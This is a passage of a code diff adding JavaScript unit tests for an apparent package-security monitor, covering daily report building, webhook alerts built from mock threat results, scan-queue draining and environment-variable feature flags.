+    stats.suspect = 2;
+
+    // Add some daily alerts
+    const origLen = dailyAlerts.length;
+    dailyAlerts.push({ name: 'suspect-a', version: '1.0', ecosystem: 'npm', findingsCount: 3 });
+    dailyAlerts.push({ name: 'suspect-b', version: '2.0', ecosystem: 'pypi', findingsCount: 1 });
+
+    try {
+      const embed = buildDailyReportEmbed();
+      assert(embed.embeds, 'Should have embeds');
+      const e = embed.embeds[0];
+      const topField = e.fields.find(f => f.name === 'Top Suspects');
+      assert(topField, 'Should have Top Suspects field');
+      assertIncludes(topField.value, 'suspect-a', 'Should include first suspect');
+    } finally {
+      console.log = origLog;
+      stats.scanned = origScanned;
+      stats.suspect = origSuspect;
+      // Remove added alerts
+      dailyAlerts.length = origLen;
+    }
+  });
+
+  // --- trySendWebhook with sandbox data in webhook ---
+
+  await asyncTest('MONITOR-COV: trySendWebhook with sandbox data exercises payload building', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    const origLog = console.log;
+    const origErr = console.error;
+    const logs = [];
+    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
+    console.log = (...args) => logs.push(args.join(' '));
+    console.error = (...args) => logs.push(args.join(' '));
+
+    try {
+      const mockResult = {
+        threats: [{ type: 'known_malicious_package', severity: 'CRITICAL' }],
+        summary: { critical: 1, high: 0, medium: 0, low: 0, total: 1 }
+      };
+      const sandboxResult = { score: 85, severity: 'CRITICAL' };
+      await trySendWebhook('evil-pkg', '2.0.0', 'npm', mockResult, sandboxResult);
+      // Will attempt webhook and fail (network), but exercises the code path
+      const anyLog = logs.join(' ');
+      assert(anyLog.includes('evil-pkg'), 'Should reference the package name');
+    } finally {
+      console.log = origLog;
+      console.error = origErr;
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      else delete process.env.MUADDIB_WEBHOOK_URL;
+    }
+  });
+
+  // --- processQueue with timeout ---
+
+  await asyncTest('MONITOR-COV: processQueue handles scan timeout', async () => {
+    const origLog = console.log;
+    const origErr = console.error;
+    const errors = [];
+    console.log = () => {};
+    console.error = (...args) => errors.push(args.join(' '));
+
+    const origErrors2 = stats.errors;
+
+    // Push an item and verify queue is drained
+    scanQueue.length = 0;
+    scanQueue.push({
+      name: 'timeout-test-pkg-' + Date.now(),
+      version: '0.0.1',
+      ecosystem: 'npm',
+      tarballUrl: null
+    });
+
+    try {
+      await processQueue();
+      assert(scanQueue.length === 0, 'Queue should be drained even with errors');
+    } finally {
+      console.log = origLog;
+      console.error = origErr;
+      stats.errors = origErrors2;
+    }
+  });
+
+  // --- sendDailyReport with no webhook (early return) ---
+
+  await asyncTest('MONITOR-COV: sendDailyReport returns early when no webhook URL', async () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    delete process.env.MUADDIB_WEBHOOK_URL;
+    const origLog = console.log;
+    console.log = () => {};
+
+    // Set stats to non-zero to verify they are NOT reset (early return)
+    const origScanned = stats.scanned;
+    stats.scanned = 42;
+
+    try {
+      await sendDailyReport();
+      // sendDailyReport checks url first; if not set, returns immediately
+      // Stats should NOT be reset because the function returned early
+      assert(stats.scanned === 42, 'Stats should NOT be reset when no webhook URL (early return)');
+    } finally {
+      console.log = origLog;
+      stats.scanned = origScanned;
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+    }
+  });
+
+  // --- isTemporalEnabled extended ---
+
+  test('MONITOR-COV: isTemporalEnabled returns true by default', () => {
+    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL;
+    delete process.env.MUADDIB_MONITOR_TEMPORAL;
+    try {
+      assert(isTemporalEnabled() === true, 'Should be true by default');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL = origEnv;
+    }
+  });
+
+  // --- isTemporalAstEnabled extended ---
+
+  test('MONITOR-COV: isTemporalAstEnabled returns true by default', () => {
+    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_AST;
+    delete process.env.MUADDIB_MONITOR_TEMPORAL_AST;
+    try {
+      assert(isTemporalAstEnabled() === true, 'Should be true by default');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_AST = origEnv;
+    }
+  });
+
+  // --- isTemporalPublishEnabled extended ---
+
+  test('MONITOR-COV: isTemporalPublishEnabled returns true by default', () => {
+    const origEnv = process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
+    delete process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH;
+    try {
+      assert(isTemporalPublishEnabled() === true, 'Should be true by default');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_TEMPORAL_PUBLISH = origEnv;
+    }
+  });
+
+  // --- isCanaryEnabled extended ---
+
+  test('MONITOR-COV: isCanaryEnabled returns true by default', () => {
+    const origEnv = process.env.MUADDIB_MONITOR_CANARY;
+    delete process.env.MUADDIB_MONITOR_CANARY;
+    try {
+      assert(isCanaryEnabled() === true, 'Should be true by default');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_CANARY = origEnv;
+    }
+  });
+
+  test('MONITOR-COV: isCanaryEnabled returns false when disabled', () => {
+    const origEnv = process.env.MUADDIB_MONITOR_CANARY;
+    process.env.MUADDIB_MONITOR_CANARY = 'false';
+    try {
+      assert(isCanaryEnabled() === false, 'Should be false when env is false');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_CANARY = origEnv;
+      else delete process.env.MUADDIB_MONITOR_CANARY;
+    }
+  });
+
+  // --- isSandboxEnabled extended ---
+
+  test('MONITOR-COV: isSandboxEnabled returns true by default', () => {
+    const origEnv = process.env.MUADDIB_MONITOR_SANDBOX;
+    delete process.env.MUADDIB_MONITOR_SANDBOX;
+    try {
+      assert(isSandboxEnabled() === true, 'Should be true by default');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_SANDBOX = origEnv;
+    }
+  });
+
+  test('MONITOR-COV: isSandboxEnabled returns false when disabled', () => {
+    const origEnv = process.env.MUADDIB_MONITOR_SANDBOX;
+    process.env.MUADDIB_MONITOR_SANDBOX = 'false';
+    try {
+      assert(isSandboxEnabled() === false, 'Should be false when env is false');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_MONITOR_SANDBOX = origEnv;
+      else delete process.env.MUADDIB_MONITOR_SANDBOX;
+    }
+  });
+
+  // --- getWebhookUrl extended ---
+
+  test('MONITOR-COV: getWebhookUrl returns url when set', () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
+    try {
+      const url = getWebhookUrl();
+      assert(url === 'https://hooks.example.com/test', 'Should return the URL');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+      else delete process.env.MUADDIB_WEBHOOK_URL;
+    }
+  });
+
+  test('MONITOR-COV: getWebhookUrl returns null when not set', () => {
+    const origEnv = process.env.MUADDIB_WEBHOOK_URL;
+    delete process.env.MUADDIB_WEBHOOK_URL;
+    try {
+      const url = getWebhookUrl();
+      assert(url === null || url === undefined || url === '', 'Should return falsy when not set');
+    } finally {
+      if (origEnv !== undefined) process.env.MUADDIB_WEBHOOK_URL = origEnv;
+    }
   });
 }
 
